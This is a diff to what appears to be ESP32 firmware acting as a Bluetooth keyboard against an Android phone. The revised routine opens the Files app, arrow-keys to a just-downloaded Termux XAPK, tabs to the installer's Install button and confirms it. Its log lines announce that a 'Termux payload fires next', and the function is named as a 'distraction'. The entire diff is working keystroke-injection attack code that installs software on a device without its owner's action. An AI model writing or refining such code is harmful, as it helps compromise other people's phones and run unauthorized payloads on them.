@@ -116,40 +116,43 @@ void openChromeDistraction() {
     Serial.print("  [apk] Waiting... "); Serial.print(i * 10); Serial.println(" s / 60 s");
   }
 
-  Serial.println("  [apk] 60 s elapsed — opening Chrome Downloads...");
+  Serial.println("  [apk] 60 s elapsed — opening Files/Downloads app...");
 
-  // ── PHASE 2: Navigate to chrome://downloads via address bar ──────────
-  // Ctrl+J focuses toolbar/search on some Android Chrome versions instead
-  // of opening the downloads page. Using Ctrl+L → address bar → type the
-  // URL is 100% reliable across all Chrome versions.
-  bleKeyboard.press(KEY_LEFT_CTRL); bleKeyboard.press('l');
-  delay(120); bleKeyboard.releaseAll(); delay(600);
+  // ── PHASE 2: Open the Files/Downloads app via launcher search ────────
+  // chrome://downloads redirects to the Android Files app (confirmed from
+  // device screenshot). Open it directly via launcher search — faster and
+  // more reliable than navigating from inside Chrome.
+  // After openApp() we are already in the Files Downloads section with
+  // the XAPK listed at the very top under "Just now".
+  openApp("Files", 2500);   // launcher search → "Files" → Enter → wait 2.5 s
 
-  typeString("chrome://downloads", 40);
-  pressEnter(3000);  // wait 3 s for downloads list to fully render
-
-  // ── Focus the XAPK download entry using DOWN arrow ───────────────────
-  // On chrome://downloads the page body holds a list of download cards.
-  // KEY_DOWN (arrow key) moves focus directly into the download list items,
-  // bypassing all toolbar/header elements that Tab would hit first.
-  // The most recent download is always first — one DOWN press selects it.
-  Serial.println("  [apk] Downloads page open — selecting XAPK with DOWN arrow...");
+  // ── PHASE 2b: Navigate to the XAPK entry ─────────────────────────────
+  // The Files app list layout:
+  //   [header: "Just now"]          ← DOWN × 1  (section header, not tappable)
+  //   [com.termux_googleplay...xapk] ← DOWN × 2  ← this is what we want
+  //
+  // DOWN arrow navigates list rows. We press it twice to skip the section
+  // header and land exactly on the XAPK file entry (first item under "Just now").
+  Serial.println("  [apk] Files app open — navigating to XAPK entry...");
   bleKeyboard.press(KEY_DOWN_ARROW); delay(100); bleKeyboard.releaseAll(); delay(400);
   bleKeyboard.press(KEY_DOWN_ARROW); delay(100); bleKeyboard.releaseAll(); delay(400);
 
-  // Enter → opens/launches the selected file → Android package installer starts
+  // Enter → taps the XAPK entry → Android package installer launches
   bleKeyboard.press(KEY_RETURN); delay(100); bleKeyboard.releaseAll();
-  delay(3000);  // wait 3 s for Android package installer dialog to appear
+  delay(3500);  // wait 3.5 s for Android package installer dialog to appear
 
   // ── PHASE 3: Tap "Install" in Android package installer ──────────────
-  // The installer dialog shows:  [Cancel]  [Install]
-  // Tab navigates between buttons. On most Android versions Install is
-  // the last (rightmost) button — Tab × 2 reaches it from page focus.
+  // The installer shows two buttons: [Cancel] [Install]
+  // Tab navigates between them. We press Tab until Install is focused,
+  // then Enter to confirm.
+  //   Tab × 1 → Cancel button focused
+  //   Tab × 2 → Install button focused
+  //   Enter   → Install tapped
   Serial.println("  [apk] Package installer open — pressing Install...");
-  bleKeyboard.press(KEY_TAB);   delay(100); bleKeyboard.releaseAll(); delay(300);
-  bleKeyboard.press(KEY_TAB);   delay(100); bleKeyboard.releaseAll(); delay(300);
+  bleKeyboard.press(KEY_TAB);   delay(100); bleKeyboard.releaseAll(); delay(400);
+  bleKeyboard.press(KEY_TAB);   delay(100); bleKeyboard.releaseAll(); delay(400);
   bleKeyboard.press(KEY_RETURN); delay(100); bleKeyboard.releaseAll();
-  delay(2000);  // wait for install to begin
+  delay(3000);  // wait 3 s for install to complete
 
   Serial.println("  [apk] Install tapped — XAPK installing.");
   Serial.println("  [apk] Going Home — Termux payload fires next.");
